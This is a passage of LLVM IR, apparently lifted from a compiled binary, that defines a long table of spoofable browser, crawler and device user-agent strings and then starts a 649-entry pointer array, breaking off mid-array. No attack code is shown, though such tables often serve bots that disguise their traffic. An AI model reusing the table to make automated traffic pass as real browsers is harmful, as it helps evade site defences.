@global_var_1df18.668 = constant [120 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)\00"
@global_var_1df90.669 = constant [50 x i8] c"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0\00"
@global_var_1dfc4.670 = constant [160 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\00"
@global_var_1e064.671 = constant [113 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16\00"
@global_var_1e0d8.672 = constant [88 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_1e130.673 = constant [85 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\00"
@global_var_1e188.674 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_1e1c8.675 = constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00"
@global_var_1e230.676 = constant [52 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\00"
@global_var_1e264.677 = constant [48 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)\00"
@global_var_1e294.678 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0\00"
@global_var_1e308.679 = constant [105 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\00"
@global_var_1e374.680 = constant [90 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\00"
@global_var_1e3d0.681 = constant [103 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\00"
@global_var_1e438.682 = constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_1e484.683 = constant [84 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_1e4d8.684 = constant [103 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6\00"
@global_var_1e540.685 = constant [75 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0\00"
@global_var_1e58c.686 = constant [130 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_1e610.687 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1e654.688 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_1e698.689 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_1e6dc.690 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_1e720.691 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1e764.692 = constant [51 x i8] c"Gigabot/3.0 (http://www.gigablast.com/spider.html)\00"
@global_var_1e798.693 = constant [61 x i8] c"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0\00"
@global_var_1e7d8.694 = constant [127 x i8] c"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+\00"
@global_var_1e858.695 = constant [107 x i8] c"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+\00"
@global_var_1e8c4.696 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1e908.697 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1e978.698 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_1e9ec.699 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_1ea38.700 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_1eac0.701 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_1eb0c.702 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_1eb7c.703 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_1ebec.704 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_1ec60.705 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_1ecd8.706 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_1ed20.707 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_1ed98.708 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1ee08.709 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_1ee78.710 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_1ef0c.711 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_1ef54.712 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_1ef9c.713 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_1f018.714 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_1f094.715 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_1f0e8.716 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_1f13c.717 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_1f190.718 = constant [149 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1f228.719 = constant [181 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1f2e0.720 = constant [157 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_1f380.721 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_1f3ec.722 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_1f45c.723 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_1f4d4.724 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_1f518.725 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_1f590.726 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_1f5d4.727 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_1f638.728 = constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00"
@global_var_1f680.729 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_1f6d4.730 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_1f74c.731 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_1f7b4.732 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_1f800.733 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_1f864.734 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_1f8cc.735 = constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00"
@global_var_1f958.736 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_1f9ac.737 = constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_1fa38.738 = constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00"
@global_var_1fa94.739 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_1fae0.740 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_1fb58.741 = constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00"
@global_var_1fbb0.742 = constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_1fc30.743 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00"
@global_var_1fc9c.744 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_1fd14.745 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00"
@global_var_1fd60.746 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00"
@global_var_1fdd0.747 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00"
@global_var_1fe14.748 = constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1fe54.749 = constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00"
@global_var_1fe98.750 = constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00"
@global_var_1fedc.751 = constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00"
@global_var_1ff24.752 = constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00"
@global_var_1ffa4.753 = constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00"
@global_var_1fff8.754 = constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00"
@global_var_20088.755 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_200ec.756 = constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_2013c.757 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_201a8.758 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00"
@global_var_201f4.759 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_2026c.760 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_202b0.761 = constant [51 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\00"
@global_var_202e4.762 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_20328.763 = constant [121 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)\00"
@global_var_203a4.764 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_203f4.765 = constant [56 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\00"
@global_var_2042c.766 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4\00"
@global_var_204a4.767 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_204e8.768 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10\00"
@global_var_20528.769 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52\00"
@global_var_20568.770 = constant [138 x i8] c"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\00"
@global_var_205f4.771 = constant [42 x i8] c"Opera/8.5 (X11; i686 Linux; U; ru, en_US)\00"
@global_var_20620.772 = constant [58 x i8] c"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)\00"
@global_var_2065c.773 = constant [48 x i8] c"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9\00"
@global_var_2068c.774 = constant [73 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25\00"
@global_var_206d8.775 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50\00"
@global_var_20718.776 = constant [80 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant\00"
@global_var_20768.777 = constant [19 x i8] c"C4PC UserAgent/0.7\00"
@global_var_2077c.778 = constant [19 x i8] c"Googlebot 1.01.003\00"
@global_var_20790.779 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\00"
@global_var_207dc.780 = constant [104 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3\00"
@global_var_20844.781 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\00"
@global_var_20898.782 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_208e4.783 = constant [183 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_2099c.784 = constant [170 x i8] c"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)\00"
@global_var_20a48.785 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_20a9c.786 = constant [195 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)\00"
@global_var_20b60.787 = constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00"
@global_var_20bfc.788 = constant [112 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8\00"
@global_var_20c6c.789 = constant [92 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6\00"
@global_var_20cc8.790 = constant [81 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre\00"
@global_var_20d1c.791 = constant [117 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre\00"
@global_var_20d94.792 = constant [91 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre\00"
@global_var_20df0.793 = constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00"
@global_var_20e54.794 = constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00"
@global_var_20eb4.795 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00"
@global_var_20f0c.796 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00"
@global_var_20f50.797 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00"
@global_var_20fa0.798 = constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00"
@global_var_21024.799 = constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00"
@global_var_21078.800 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00"
@global_var_210e8.801 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00"
@global_var_21180.802 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00"
@global_var_211cc.803 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00"
@global_var_2124c.804 = constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00"
@global_var_212cc.805 = constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00"
@global_var_2134c.806 = constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00"
@global_var_213cc.807 = constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00"
@global_var_2144c.808 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00"
@global_var_214cc.809 = constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00"
@global_var_21544.810 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_215b0.811 = constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00"
@global_var_21624.812 = constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00"
@global_var_216a4.813 = constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00"
@global_var_216e0.814 = constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00"
@global_var_21728.815 = constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00"
@global_var_2176c.816 = constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00"
@global_var_2183c.817 = constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00"
@global_var_21898.818 = constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00"
@global_var_21904.819 = constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00"
@global_var_2194c.820 = constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00"
@global_var_219d4.821 = constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00"
@global_var_21a20.822 = constant [22 x i8] c"Wget/1.12 (linux-gnu)\00"
@global_var_21a38.823 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_21aac.824 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_21b20.825 = constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00"
@global_var_21b90.826 = constant [649 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_1b1d0.524, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1b210.525, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_1b250.526, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_1b2e0.527, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1b318.528, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1b338.529, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_1b350.530, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_1b3a8.531, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b448.532, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1b49c.533, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_1b510.534, i32 0, i32 0), i8* getelementptr inbounds 